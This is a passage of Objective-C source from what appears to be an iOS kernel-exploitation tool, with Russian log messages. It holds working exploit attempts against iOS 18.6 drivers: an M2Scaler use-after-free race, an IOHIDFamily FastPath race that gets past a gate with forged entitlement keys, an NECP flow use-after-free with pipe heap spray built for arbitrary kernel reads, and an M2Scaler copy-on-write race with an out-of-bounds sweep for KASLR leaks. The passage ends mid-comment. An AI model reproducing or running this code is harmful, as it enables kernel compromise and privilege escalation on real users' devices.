    markerHunt(0xDEAD0001, @"висит ли victim-маркер после close");
    dumpClient(victim, @"слот victim после спрея (кто-то занял?)");
    if (sprayOK > 0) dumpClient(spray[0], @"spray[0] клиент (сравнение layout)");

    // ---------------- STEP 5: триггер scheduler ----------------
    kpNote(r, @"--- STEP 5: триггер scheduler (100 раундов × 50 async-опов + compositor trigger) ---");
    // Программная замена «tap Dynamic Island» из оригинального PoC: видимый
    // CALayer с contents = наша IOSurface + CADisplayLink, который каждый кадр
    // переписывает пиксели и переназначает contents. Compositor/display pipe
    // обязан каждый кадр читать и масштабировать поверхность через M2Scaler —
    // scheduler крутится без участия пользователя. UI только на main thread.
    KPM2ScalerTrigger *trig = [KPM2ScalerTrigger new];
    __block BOOL trigStarted = NO;
    dispatch_sync(dispatch_get_main_queue(), ^{
        [trig startWithSurface:srcS];
        trigStarted = (trig.link != nil);
    });
    kpNote(r, trigStarted
        ? @"  compositor trigger запущен (CADisplayLink, IOSurface на экране 64x64, linear scale)"
        : @"  compositor trigger НЕ запустился (нет активного окна) — идём только на async-опах");
    for (int round = 0; round < 100; round++) {
        for (int i = 0; i < sprayOK && i < 50; i++) {
            if (spray[i] != IO_OBJECT_NULL) {
                uint8_t tsd[KP_M2_TSD_SIZE];
                memcpy(tsd, baseline, KP_M2_TSD_SIZE);
                *(uint64_t *)(tsd + 0x008) = 1;
                IOConnectCallMethod(spray[i], 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
            }
        }
        if (round % 10 == 0)
            kpNote(r, [NSString stringWithFormat:@"  раунд %d/100 — живы (паника возможна в любой момент)", round]);
        usleep(100000);
    }

    kpNote(r, @"--- 100 раундов завершены, паники не было ---");
    dispatch_sync(dispatch_get_main_queue(), ^{
        [trig stop];
    });
    kpNote(r, @"  compositor trigger остановлен");
    IOObjectRelease(svc);
    [r appendString:@"\n=== M2UAF: дожили до конца без паники — баг не сработал в этом прогоне, повторить ===\n"];
    [r appendString:@"Compositor trigger гнал scaler все 100 раундов. Если паники не было — записи scheduler'а в этом прогоне чистятся корректно; повторить (гонка вероятностная). Паника ПОСЛЕ возврата отчёта тоже считается — весь ход уже в kexproof-live.log на диске.\n"];
    return r;
}

#pragma mark - HID FastPath UAF (CVE-2026-28992)

// close (sel1) drops provider state unlocked; copyEvent (sel2) calls into it
// under a per-conn lock. Race across 15 connections to the same provider →
// MTE tag fault on A17+. Unpatched on 18.6 (fixed 18.7.9). Gate: sel0 checks
// the caller-supplied OSDictionary for entitlement keys instead of
// initWithTask flags — sandbox passes by sending them itself.
#define KP_HID_NUM_CONNS 15
#define KP_HID_COPY_THREADS 8

static _Atomic bool gHidStop = false;
static io_connect_t gHidConns[KP_HID_NUM_CONNS];
static NSData *gHidGateXML = nil;

static kern_return_t kpHidGate(io_connect_t conn)
{
    uint64_t scalar = 0;
    return IOConnectCallMethod(conn, 0, &scalar, 1,
                               gHidGateXML.bytes, gHidGateXML.length,
                               NULL, NULL, NULL, NULL);
}

static void *kpHidChurnMain(void *arg)
{
    uint64_t scalar = 0;
    while (!atomic_load(&gHidStop)) {
        IOConnectCallMethod(gHidConns[0], 1, &scalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
        kpHidGate(gHidConns[0]);
    }
    return NULL;
}

static void *kpHidCopyMain(void *arg)
{
    int idx = (int)(intptr_t)arg;
    uint64_t args[2] = { 0, 1 };
    while (!atomic_load(&gHidStop)) {
        IOConnectCallMethod(gHidConns[idx], 2, args, 2, NULL, 0, NULL, NULL, NULL, NULL);
    }
    return NULL;
}

+ (NSString *)hidUafReport
{
    NSMutableString *r = [NSMutableString string];
    kpNote(r, @"=== CVE-2026-28992: IOHIDFamily FastPathUserClient UAF (race close vs copyEvent) ===");
    kpNote(r, @"!!! МОЖЕТ ПАНИКОВАТЬ (MTE tag check fault на A17+) — паника = баг подтверждён !!!");
    kpNote(r, @"Сценарий: 15 коннекшенов к IOHIDEventService (type 2), gate sel0 с entitlement-bypass XML, churn close/reopen на conn[0] + 8 тредов copyEvent на conn[1..14], до 30с.");

    gHidGateXML = [NSPropertyListSerialization dataWithPropertyList:@{
                       @"FastPathHasEntitlement": @YES,
                       @"FastPathMotionEventEntitlement": @YES}
                                                              format:NSPropertyListXMLFormat_v1_0
                                                               options:0 error:nil];
    if (!gHidGateXML) { [r appendString:@"FAIL: gate XML не сериализовался\n"]; return r; }

    errno = 0;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                       IOServiceMatching("IOHIDEventService"));
    if (!service) {
        kpNote(r, [NSString stringWithFormat:@"  IOHIDEventService: не найден (errno=%d) — sandbox прячет", errno]);
        [r appendString:@"\n=== HID UAF SKIP: сервис недоступен ===\n"];
        return r;
    }
    kpNote(r, [NSString stringWithFormat:@"  IOHIDEventService: 0x%x", service]);

    int opened = 0, gated = 0;
    for (int i = 0; i < KP_HID_NUM_CONNS; i++) {
        gHidConns[i] = IO_OBJECT_NULL;
        kern_return_t kr = IOServiceOpen(service, mach_task_self(), 2, &gHidConns[i]);
        if (kr != KERN_SUCCESS || gHidConns[i] == IO_OBJECT_NULL) {
            kpNote(r, [NSString stringWithFormat:@"  IOServiceOpen[%d] (type 2): FAIL kr=0x%x (%s)", i, kr, mach_error_string(kr)]);
            continue;
        }
        opened++;
        kern_return_t gkr = kpHidGate(gHidConns[i]);
        if (gkr == KERN_SUCCESS) gated++;
        else kpNote(r, [NSString stringWithFormat:@"  gate[%d]: kr=0x%x (%s) — entitlement bypass частично/не сработал", i, gkr, mach_error_string(gkr)]);
    }
    kpNote(r, [NSString stringWithFormat:@"  открыто %d/%d коннекшенов, gate прошли %d", opened, KP_HID_NUM_CONNS, gated]);
    if (!opened) {
        IOObjectRelease(service);
        [r appendString:@"\n=== HID UAF SKIP: ни одного коннекшена — sandbox deny iokit-user-client-class ===\n"];
        return r;
    }

    // Gate slammed with exclusive-access on the system service (backboardd
    // holds FastPath permanently). Fallback: our own virtual HID device.
    if (!gated) {
        kpNote(r, @"  gate закрыт на системном сервисе (exclusive, backboardd держит FastPath) — пробую виртуальный HID-девайс…");
        extern CFTypeRef IOHIDUserDeviceCreate(CFAllocatorRef allocator, CFDictionaryRef properties);
        NSDictionary *devProps = @{
            @"VendorID": @0x1337,
            @"ProductID": @0x4242,
            @"Product": @"KPTestHID",
            @"DeviceUsagePairs": @[ @{ @"DeviceUsagePage": @1, @"DeviceUsage": @6 } ],
            @"Elements": @[ @{ @"ElementCookie": @1, @"UsagePage": @1, @"Usage": @6,
                               @"Type": @2, @"ReportCount": @8, @"ReportSize": @1 } ],
        };
        CFTypeRef vdev = IOHIDUserDeviceCreate(kCFAllocatorDefault, (__bridge CFDictionaryRef)devProps);
        if (!vdev) {
            kpNote(r, @"  IOHIDUserDeviceCreate вернул NULL — на iOS нужен entitlement com.apple.developer.hid.virtual.device, у нас его нет");
        } else {
            kpNote(r, @"  виртуальный девайс создан — ищу его сервис…");
            usleep(300000);
            io_service_t vservice = 0;
            io_iterator_t it = 0;
            if (IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHIDUserDevice"), &it) == KERN_SUCCESS && it) {
                vservice = IOIteratorNext(it);
                IOObjectRelease(it);
            }
            if (vservice) {
                for (int i = 0; i < opened; i++) if (gHidConns[i] != IO_OBJECT_NULL) { IOServiceClose(gHidConns[i]); gHidConns[i] = IO_OBJECT_NULL; }
                opened = 0; gated = 0;
                for (int i = 0; i < KP_HID_NUM_CONNS; i++) {
                    kern_return_t kr = IOServiceOpen(vservice, mach_task_self(), 2, &gHidConns[i]);
                    if (kr != KERN_SUCCESS || gHidConns[i] == IO_OBJECT_NULL) continue;
                    opened++;
                    if (kpHidGate(gHidConns[i]) == KERN_SUCCESS) gated++;
                }
                kpNote(r, [NSString stringWithFormat:@"  на виртуальном девайсе: открыто %d, gate %d", opened, gated]);
                IOObjectRelease(vservice);
            } else {
                kpNote(r, @"  сервис виртуального девайса не найден в реестре");
            }
            CFRelease(vdev);
        }
        if (!gated) {
            IOObjectRelease(service);
            for (int i = 0; i < opened; i++) if (gHidConns[i] != IO_OBJECT_NULL) IOServiceClose(gHidConns[i]);
            [r appendString:@"\n=== HID UAF SKIP: gate не пройден ни на системном сервисе, ни на виртуальном — entitlement bypass на 18.6 не даёт FastPath-сессию ===\n"];
            return r;
        }
    }

    atomic_store(&gHidStop, false);
    pthread_t churn;
    pthread_create(&churn, NULL, kpHidChurnMain, NULL);
    pthread_t copiers[KP_HID_COPY_THREADS];
    for (int i = 0; i < KP_HID_COPY_THREADS; i++) {
        int idx = (i % (KP_HID_NUM_CONNS - 1)) + 1;
        pthread_create(&copiers[i], NULL, kpHidCopyMain, (void *)(intptr_t)idx);
    }
    kpNote(r, @"  гонка запущена: churn(conn[0]) + 8×copyEvent — паника обычно < 5с, ждём до 30с…");

    for (int s = 0; s < 6; s++) {
        sleep(5);
        kpNote(r, [NSString stringWithFormat:@"  …%dс — живы (паника возможна в любой момент)", (s + 1) * 5]);
    }
    atomic_store(&gHidStop, true);
    pthread_join(churn, NULL);
    for (int i = 0; i < KP_HID_COPY_THREADS; i++) pthread_join(copiers[i], NULL);
    for (int i = 0; i < KP_HID_NUM_CONNS; i++)
        if (gHidConns[i] != IO_OBJECT_NULL) IOServiceClose(gHidConns[i]);
    IOObjectRelease(service);
    kpNote(r, @"--- 30с без паники — баг не сложился в этом прогоне (тайминг) или поверхность отличается ---");
    [r appendString:@"\n=== HID UAF: дожили до конца без паники — повторить; если упорно не падает — смотрим syslog на didTerminate/teardown ===\n"];
    return r;
}

#pragma mark - NECP UAF probe (natsuk1 vector, verified against 18.6)

#define KP_NECP_OPEN        501
#define KP_NECP_ACTION      502
#define KP_NECP_ADD_CLIENT  0x01
#define KP_NECP_COPY_RESULT 0x04
#define KP_NECP_ADD_FLOW    0x11
#define KP_NECP_REMOVE_FLOW 0x12
#define KP_NECP_GATE_BYTE   9
#define KP_NCF_BUF_SZ       0x800
#define KP_NCF_ASSIGNED_OFF     0x5A0
#define KP_NCF_ASSIGNED_LEN_OFF 0x5A8
#define KP_NECP_EXHAUST_N   256
#define KP_NECP_SPRAY_N     512
#define KP_NECP_COPY_SZ     8192

typedef struct __attribute__((packed)) {
    uint8_t  out_uuid[16];
    uint8_t  in_uuid[16];
    uint16_t flags;
    uint16_t nexus_count;
    uint32_t pad;
} kp_necp_flow_req_t;

static long kpNecpAction(int fd, uint32_t action, void *u, size_t ul, void *d, size_t dl)
{
    return syscall(KP_NECP_ACTION, fd, action, u, (uint32_t)ul, d, (uint32_t)dl);
}

static int kpNecpAddFlowRaw(int fd, const uint8_t *clientUUID, uint8_t *flowUUIDOut)
{
    kp_necp_flow_req_t req;
    memset(&req, 0, sizeof(req));
    memcpy(req.in_uuid, clientUUID, 16);
    req.flags = 0x0040;
    req.nexus_count = 0;
    long r = kpNecpAction(fd, KP_NECP_ADD_FLOW, (void *)clientUUID, 16, &req, sizeof(req));
    if (r == 0) {
        memcpy(flowUUIDOut, req.out_uuid, 16);
        int az = 1;
        for (int j = 0; j < 16; j++) if (flowUUIDOut[j]) { az = 0; break; }
        if (az) memcpy(flowUUIDOut, req.in_uuid, 16);
    }
    return (int)r;
}

static int kpNecpRemoveFlow(int fd, const uint8_t *flowUUID)
{
    return (int)kpNecpAction(fd, KP_NECP_REMOVE_FLOW, (void *)flowUUID, 16, NULL, 0);
}

static int gNecpPipe[2] = { -1, -1 };
static volatile int gNecpSprayGo = 0, gNecpSprayDone = 0, gNecpSprayReady = 0, gNecpSprayWrote = 0;
static const uint8_t *gNecpSpraySrc = NULL;
static size_t gNecpSprayLen = 0;

static void *kpNecpSprayMain(void *arg)
{
    (void)arg;
    __sync_fetch_and_add(&gNecpSprayReady, 1);
    while (!gNecpSprayGo) __asm__ volatile("yield");
    int wrote = 0;
    for (int i = 0; i < KP_NECP_SPRAY_N; i++) {
        ssize_t w = write(gNecpPipe[1], gNecpSpraySrc, gNecpSprayLen);
        if (w > 0) wrote++;
        else if (w < 0 && errno != EAGAIN) break;
    }
    gNecpSprayWrote = wrote;
    __sync_fetch_and_add(&gNecpSprayDone, 1);
    return NULL;
}

// one UAF attempt with a fake flow blob; returns copy_result length or <0
static long kpNecpUafExecute(int fd, const uint8_t *clientUUID,
                             const uint8_t *fake, size_t fakeSz,
                             uint8_t *out, size_t outSz, NSMutableString *r)
{
    uint8_t exhaustUUIDs[KP_NECP_EXHAUST_N][16];
    int nExhaust = 0;
    for (int i = 0; i < KP_NECP_EXHAUST_N; i++) {
        if (kpNecpAddFlowRaw(fd, clientUUID, exhaustUUIDs[i]) == 0) nExhaust++;
    }
    kpNote(r, [NSString stringWithFormat:@"  exhaust: %d/%d flow добавлено", nExhaust, KP_NECP_EXHAUST_N]);
    uint8_t flowUUID[16];
    int haveFlow = 0;
    for (int retry = 0; retry < 64 && !haveFlow; retry++) {
        uint8_t u[16];
        if (kpNecpAddFlowRaw(fd, clientUUID, u) != 0) break;
        if (u[KP_NECP_GATE_BYTE] & 0x01) { memcpy(flowUUID, u, 16); haveFlow = 1; }
        else kpNecpRemoveFlow(fd, u);
    }
    if (!haveFlow) {
        for (int i = 0; i < nExhaust; i++) kpNecpRemoveFlow(fd, exhaustUUIDs[i]);
        kpNote(r, [NSString stringWithFormat:@"  gated flow не найден за 64 попытки (exhaust=%d)", nExhaust]);
        return -2;
    }
    kpNote(r, @"  gated flow найден — remove + spray");
    uint8_t *heap = mmap(NULL, KP_NCF_BUF_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (heap == MAP_FAILED) return -3;
    memset(heap, 0, KP_NCF_BUF_SZ);
    memcpy(heap, fake, fakeSz > KP_NCF_BUF_SZ ? KP_NCF_BUF_SZ : fakeSz);
    if (pipe(gNecpPipe) != 0) { munmap(heap, KP_NCF_BUF_SZ); return -4; }
    // Non-blocking: the buffer fills after ~8-64 writes and a blocking write
    // would sleep forever with no reader — this was the hang.
    fcntl(gNecpPipe[0], F_SETFL, O_NONBLOCK);
    fcntl(gNecpPipe[1], F_SETFL, O_NONBLOCK);
    gNecpSpraySrc = heap;
    gNecpSprayLen = KP_NCF_BUF_SZ - 0x10;
    gNecpSprayReady = gNecpSprayGo = gNecpSprayDone = gNecpSprayWrote = 0;
    pthread_t tid;
    pthread_create(&tid, NULL, kpNecpSprayMain, NULL);
    while (gNecpSprayReady == 0) __asm__ volatile("yield");
    kpNecpRemoveFlow(fd, flowUUID);
    gNecpSprayGo = 1;
    for (long spin = 0; spin < 50000000L && !gNecpSprayDone; spin++) __asm__ volatile("yield");
    pthread_join(tid, NULL);
    kpNote(r, [NSString stringWithFormat:@"  spray: %d записей в pipe (non-block), copy_result…", gNecpSprayWrote]);
    long r3 = kpNecpAction(fd, KP_NECP_COPY_RESULT, (void *)clientUUID, 16, out, outSz);
    if (gNecpPipe[0] >= 0) { close(gNecpPipe[0]); gNecpPipe[0] = -1; }
    if (gNecpPipe[1] >= 0) { close(gNecpPipe[1]); gNecpPipe[1] = -1; }
    for (int i = 0; i < nExhaust; i++) kpNecpRemoveFlow(fd, exhaustUUIDs[i]);
    munmap(heap, KP_NCF_BUF_SZ);
    return r3;
}

+ (NSString *)necpUafProbeReport
{
    NSMutableString *r = [NSMutableString string];
    kpNote(r, @"=== NECP flow UAF probe (natsuk1 vector → 18.6) ===");
    kpNote(r, @"add_flow → remove_flow(gated) → pipe spray → copy_result. >0 = dangling flow читается → arbitrary kread (fake flow assigned_addr). Независим от ClearSword второй баг.");
    kpNote(r, @"kread-тест: fake flow с assigned=kernel base — ждём magic 0xfeedfacf в copy_result.");

    errno = 0;
    int fd = (int)syscall(KP_NECP_OPEN, 0);
    if (fd < 0) {
        kpNote(r, [NSString stringWithFormat:@"  necp_open: FAIL errno=%d (%s) — NECP недоступен из sandbox?", errno, strerror(errno)]);
        [r appendString:@"\n=== NECP SKIP: necp_open не прошёл ===\n"];
        return r;
    }
    uint8_t uuid[16];
    {
        uint8_t params[1] = {0};
        long rc = kpNecpAction(fd, KP_NECP_ADD_CLIENT, uuid, 16, params, 1);
        if (rc != 0) {
            kpNote(r, [NSString stringWithFormat:@"  add_client: FAIL rc=%ld errno=%d", rc, errno]);
            close(fd);
            [r appendString:@"\n=== NECP SKIP: add_client не прошёл ===\n"];
            return r;
        }
    }
    kpNote(r, [NSString stringWithFormat:@"  necp_open fd=%d · client=%02x%02x%02x%02x", fd, uuid[0], uuid[1], uuid[2], uuid[3]]);

    // Stage 0 (baseline): copy_result WITHOUT remove_flow. If it returns the
    // same 241 bytes — that's legal cached-result behavior, not a UAF.
    {
        uint8_t flowUUID[16];
        int got = (kpNecpAddFlowRaw(fd, uuid, flowUUID) == 0);
        uint8_t *res = calloc(1, KP_NECP_COPY_SZ);
        long r0 = kpNecpAction(fd, KP_NECP_COPY_RESULT, (void *)uuid, 16, res, KP_NECP_COPY_SZ);
        kpNote(r, [NSString stringWithFormat:@"  stage0 baseline (add_flow, БЕЗ remove): flow=%d copy_result → %ld%@",
                  got, r0, r0 > 0 ? @"  ⚠ ВНИМАНИЕ: copy_result работает и без remove — «UAF» может быть легальным кэшем!" : @" (ок: без remove не читается)"]);
        free(res);
        if (r0 > 0) {
            for (int o = 0; o < 0x20; o += 8) {
                uint64_t q = 0;
                memcpy(&q, res + o, 8);
                kpNote(r, [NSString stringWithFormat:@"    baseline+0x%02x: %#018llx", o, (unsigned long long)q]);
            }
        }
        if (got) kpNecpRemoveFlow(fd, flowUUID);
    }

    // Stage 1: does copy_result return anything after remove? (dangling flow)
    {
        uint8_t fake[KP_NCF_BUF_SZ];
        memset(fake, 0, sizeof(fake));
        uint8_t *res = calloc(1, KP_NECP_COPY_SZ);
        long r3 = kpNecpUafExecute(fd, uuid, fake, sizeof(fake), res, KP_NECP_COPY_SZ, r);
        kpNote(r, [NSString stringWithFormat:@"  stage1 (zero fake): copy_result → %ld%@", r3,
                  r3 > 0 ? @"  ← DANGLING FLOW ЖИВ — UAF подтверждён!" : @""]);
        if (r3 > 0) {
            int nz = 0;
            for (long i = 0; i < r3 && i < 256; i++) if (res[i]) nz++;
            kpNote(r, [NSString stringWithFormat:@"  первые 256 байт: ненулевых %d (нулевой fake = системные данные подменены спреем?)", nz]);
            long dumpLen = r3 < 256 ? r3 : 256;
            for (long o = 0; o < dumpLen; o += 8) {
                uint64_t q = 0;
                memcpy(&q, res + o, 8);
                if (q) kpNote(r, [NSString stringWithFormat:@"    leak+0x%02lx: %#018llx", o, (unsigned long long)q]);
            }
        }
        free(res);
        if (r3 <= 0) {
            close(fd);
            [r appendString:@"\n=== NECP: dangling flow не получен — на 18.6 баг, похоже, закрыт (или гейт-байт/оффсеты другие; syslog покажет VIOLATION если NECP заметил) ===\n"];
            return r;
        }
    }

    // Stage 2: arbitrary kread — fake flow with assigned_addr = kernel base.
    {
        uint64_t kbase = kconstant(base);
        uint8_t fake[KP_NCF_BUF_SZ];
        memset(fake, 0, sizeof(fake));
        *(uint64_t *)(fake + 0x00) = 0;
        *(uint64_t *)(fake + 0x88) = 0;
        *(uint64_t *)(fake + KP_NCF_ASSIGNED_OFF) = kbase;
        *(uint64_t *)(fake + KP_NCF_ASSIGNED_LEN_OFF) = 0x40;
        uint8_t *res = calloc(1, KP_NECP_COPY_SZ);
        long r3 = kpNecpUafExecute(fd, uuid, fake, sizeof(fake), res, 0x40, r);
        kpNote(r, [NSString stringWithFormat:@"  stage2 (assigned=kernel base %#llx): copy_result → %ld", (unsigned long long)kbase, r3]);
        if (r3 > 0) {
            uint32_t magic = 0;
            memcpy(&magic, res, 4);
            kpNote(r, [NSString stringWithFormat:@"  qword0: %#018llx · magic32: 0x%08x (ждём 0xfeedfacf)",
                      (unsigned long long)*(uint64_t *)res, magic]);
            if (magic == 0xfeedfacf) {
                kpNote(r, @"=== NECP KREAD VERIFIED: произвольное чтение ядра через NECP UAF — второй, независимый от ClearSword примитив! ===");
            } else {
                kpNote(r, @"  magic не совпал — assigned_addr оффсет другой на 18.6 или fake flow layout изменился (данные есть — UAF жив, донастроить layout)");
            }
        }
        free(res);
    }
    close(fd);
    return r;
}

#pragma mark - M2Scaler CVE-2025-43510 COW race + OOB sweep (PoC v3 port)

typedef struct {
    uint64_t ptr, size;
    uint32_t stride, pad;
} KPM2PlaneInfo;

typedef struct {
    uint32_t plane_count, format, width, height;
    KPM2PlaneInfo planes[64];
} KPM2MultiPlaneDesc;

typedef struct {
    uint32_t plane_count, format, width, height;
    KPM2PlaneInfo planes[4];
    uint32_t out_plane_count, out_format, out_width, out_height;
    KPM2PlaneInfo out_planes[4];
} KPM2ScalerOpDesc;

#define KP_M2_PAGE 0x4000
#define KP_M2_RACE_BUF (4 * KP_M2_PAGE)
#define KP_M2_RACE_THREADS 12
#define KP_M2_RACE_ITERS 50000

static _Atomic bool gM2CowStop = false;
static void *gM2CowSrc = MAP_FAILED;

static void *kpM2CowFlipper(void *arg)
{
    volatile uint8_t *p = (volatile uint8_t *)gM2CowSrc;
    while (!atomic_load_explicit(&gM2CowStop, memory_order_relaxed)) {
        *p = 0x41; __asm__ volatile("dmb ish" ::: "memory");
        *p = 0x42; __asm__ volatile("dmb ish" ::: "memory");
    }
    return NULL;
}

static const char *kpM2Meaning(kern_return_t kr)
{
    switch (kr) {
        case 0: return "  ← SUCCESS с пустым вводом!";
        case 0xe00002be: return " (NotPermitted)";
        case 0xe00002c2: return " (BadArgument)";
        case 0xe00002c7: return " (Unsupported)";
        case 0xe00002c5: return " (Busy)";
        case 0xe00002bc: return " (Error)";
        case 0xe00002cd: return " (Invalid)";
        case 0xe00002ca: return " (NoMemory)";
        case 0xe0000001: return " (KERN_INVALID_ARGUMENT)";
    }
    return "";
}

+ (NSString *)m2CowRaceReport
{
    NSMutableString *r = [NSMutableString string];
    kpNote(r, @"=== AppleM2ScalerCSCDriver: probe + OOB sweep + COW race (CVE-2025-43510 / CVE-2026-43655, PoC v3) ===");
    kpNote(r, @"!!! COW race МОЖЕТ РЕБУТНУТЬ — ребут в гонке и есть подтверждение COW-уязвимости !!!");

    io_connect_t conn = IO_OBJECT_NULL;
    int usedType = -1;
    // type 1 FIRST: type-0 connections on 18.6 reject raw-VA descriptors with
    // BadArgument (validated IOSurface-ID-only ABI). The COW-vulnerable path
    // from the PoC needs the type-1 external method surface.
    for (int ut = 1; ut >= 0 && conn == IO_OBJECT_NULL; ut--) {
        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                       IOServiceMatching("AppleM2ScalerCSCDriver"));
        if (!svc) { [r appendString:@"\n=== M2 SKIP: сервис не найден ===\n"]; return r; }
        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), ut, &conn);
        IOObjectRelease(svc);
        if (kr != KERN_SUCCESS) conn = IO_OBJECT_NULL;
        else { usedType = ut; kpNote(r, [NSString stringWithFormat:@"  открыт userType=%d conn=0x%x", ut, conn]); }
    }
    if (conn == IO_OBJECT_NULL) { [r appendString:@"\n=== M2 SKIP: IOServiceOpen не прошёл ===\n"]; return r; }
    (void)usedType;

    // Phase 1: probe all selectors 0-15 with zero input
    kpNote(r, @"  --- probe методов (sel 0-15, 512B нулей) ---");
    uint8_t inBuf[512] = {0};
    for (int sel = 0; sel <= 15; sel++) {
        uint64_t outS[32] = {0}; size_t outC = 32;
        kern_return_t kr = IOConnectCallMethod(conn, sel, NULL, 0, inBuf, sizeof(inBuf),
                                               outS, &outC, NULL, NULL);
        kpNote(r, [NSString stringWithFormat:@"    sel %2d: kr=0x%08x%s outCnt=%zu", sel, kr, kpM2Meaning(kr), outC]);
        for (size_t i = 0; i < outC && i < 8; i++)
            if (outS[i]) kpNote(r, [NSString stringWithFormat:@"      outS[%zu]=%#018llx", i, (unsigned long long)outS[i]]);
    }

    // Phase 2: OOB read boundary sweep (MultiPlaneDescriptor, sel 5-7)
    kpNote(r, @"  --- OOB sweep (plane_count 1-8, sel 5-7) ---");
    void *buf = mmap(NULL, KP_M2_PAGE * 64, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED) { IOServiceClose(conn); [r appendString:@"FAIL: mmap\n"]; return r; }
    memset(buf, 0xab, KP_M2_PAGE * 64);
    for (int sel = 5; sel <= 7; sel++) {
        for (int pc = 1; pc <= 8; pc++) {
            KPM2MultiPlaneDesc desc = {};
            desc.plane_count = pc;
            desc.format = 0x7f;
            desc.width = 64; desc.height = 64;
            for (int i = 0; i < pc && i < 64; i++) {
                desc.planes[i].ptr = (uint64_t)((uint8_t *)buf + i * KP_M2_PAGE);
                desc.planes[i].size = KP_M2_PAGE;
                desc.planes[i].stride = 64;
            }
            uint64_t outS[32] = {0}; size_t outC = 32;
            kern_return_t kr = IOConnectCallMethod(conn, sel, NULL, 0, &desc, sizeof(desc),
                                                   outS, &outC, NULL, NULL);
            NSMutableString *line = [NSMutableString stringWithFormat:@"    sel=%d pc=%d kr=0x%x outCnt=%zu", sel, pc, kr, outC];
            for (size_t i = 0; i < outC; i++) {
                if (outS[i] > 0xfffffff000000000ULL) {
                    [line appendFormat:@"  [!!] KPTR[%zu]=%#018llx ← KASLR LEAK", i, (unsigned long long)outS[i]];
                } else if (outS[i]) {
                    [line appendFormat:@"  outS[%zu]=%#018llx", i, (unsigned long long)outS[i]];
                }
            }
            kpNote(r, line);
        }
    }
    munmap(buf, KP_M2_PAGE * 64);

    // Phase 3: COW race
    kpNote(r, @"  --- COW race (probe sel 0-7, потом 50k итераций × 12 флипперов) ---");
    void *testBuf = mmap(NULL, KP_M2_RACE_BUF, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    void *outBuf = mmap(NULL, KP_M2_RACE_BUF, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (testBuf == MAP_FAILED || outBuf == MAP_FAILED) { IOServiceClose(conn); [r appendString:@"FAIL: mmap2\n"]; return r; }
    memset(testBuf, 0x41, KP_M2_RACE_BUF);
    for (int sel = 0; sel <= 7; sel++) {
        KPM2ScalerOpDesc desc = {};
        desc.plane_count = 1; desc.format = 0x7f;
        desc.width = 64; desc.height = 64;
        desc.planes[0].ptr = (uint64_t)(uintptr_t)testBuf;
        desc.planes[0].size = KP_M2_RACE_BUF; desc.planes[0].stride = 64;
        desc.out_plane_count = 1; desc.out_format = 0x7f;
        desc.out_width = 64; desc.out_height = 64;
        desc.out_planes[0].ptr = (uint64_t)(uintptr_t)outBuf;
        desc.out_planes[0].size = KP_M2_RACE_BUF; desc.out_planes[0].stride = 64;
        uint64_t outS[32] = {0}; size_t outC = 32;
        kern_return_t kr = IOConnectCallMethod(conn, sel, NULL, 0, &desc, sizeof(desc),
                                               outS, &outC, NULL, NULL);
        kpNote(r, [NSString stringWithFormat:@"    probe sel %d kr=0x%08x%@", sel, kr,
                  kr == 0 ? @"  ← ПРИНИМАЕТ ВВОД!" : (kr == 0xe00002c2 ? @" (BadArgument)" : (kr == 0xe00002c7 ? @" (Unsupported)" : @" (Error)"))]);
    }
    vm_address_t cow = 0; vm_prot_t c, m;
    kern_return_t rkr = vm_remap(mach_task_self(), &cow, KP_M2_RACE_BUF, 0,
                                 VM_FLAGS_ANYWHERE, mach_task_self(),
                                 (vm_address_t)testBuf, TRUE, &c, &m, VM_INHERIT_DEFAULT);
    if (rkr != KERN_SUCCESS) {
        kpNote(r, [NSString stringWithFormat:@"  vm_remap: 0x%x — COW race невозможен", rkr]);
        IOServiceClose(conn);
        return r;
    }
    kpNote(r, [NSString stringWithFormat:@"  COW remap OK: src=%p cow=0x%lx — гонка стартует (ребут возможен в любой момент)", testBuf, (unsigned long)cow]);
    gM2CowSrc = testBuf;
    atomic_store(&gM2CowStop, false);
    pthread_t th[KP_M2_RACE_THREADS];
    for (int i = 0; i < KP_M2_RACE_THREADS; i++) pthread_create(&th[i], NULL, kpM2CowFlipper, NULL);
    for (int i = 0; i < KP_M2_RACE_ITERS; i++) {
        int sel = (i % 8);
        KPM2ScalerOpDesc desc = {};
        desc.plane_count = 1; desc.format = 0x7f;
        desc.width = 64; desc.height = 64;
        desc.planes[0].ptr = cow;
        desc.planes[0].size = KP_M2_RACE_BUF; desc.planes[0].stride = 64;
        desc.out_plane_count = 1; desc.out_format = 0x7f;
        desc.out_width = 64; desc.out_height = 64;
        desc.out_planes[0].ptr = (uint64_t)(uintptr_t)outBuf;
        desc.out_planes[0].size = KP_M2_RACE_BUF; desc.out_planes[0].stride = 64;
        kern_return_t rr = IOConnectCallMethod(conn, sel, NULL, 0, &desc, sizeof(desc),
                                               NULL, NULL, NULL, NULL);
        if (i < 16 || (rr == 0 && i < 200))
            kpNote(r, [NSString stringWithFormat:@"    [%d] sel=%d kr=0x%x", i, sel, rr]);
        if (i % 5000 == 0) kpNote(r, [NSString stringWithFormat:@"    %d/%d — живы", i, KP_M2_RACE_ITERS]);
    }
    atomic_store(&gM2CowStop, true);
    for (int i = 0; i < KP_M2_RACE_THREADS; i++) pthread_join(th[i], NULL);
    vm_deallocate(mach_task_self(), cow, KP_M2_RACE_BUF);
    munmap(testBuf, KP_M2_RACE_BUF);
    munmap(outBuf, KP_M2_RACE_BUF);
    IOServiceClose(conn);
    kpNote(r, @"--- COW race завершён без паники: драйвер на 18.6 не использует COW-уязвимый путь копирования по sel 0-7 (или гонка не сложилась — повторить) ---");
    [r appendString:@"\n=== M2 COW race: дожили до конца. Все kr и probe-результаты выше — по ним решаем, есть ли OOB read (KPTR leak) и жив ли COW path ===\n"];
    return r;
}

#pragma mark - AppleJPEGDriver UAF (CVE-2026-20687)

// startDecoder Timeout/terminate UAF: async decode → queue_io_gated pushes
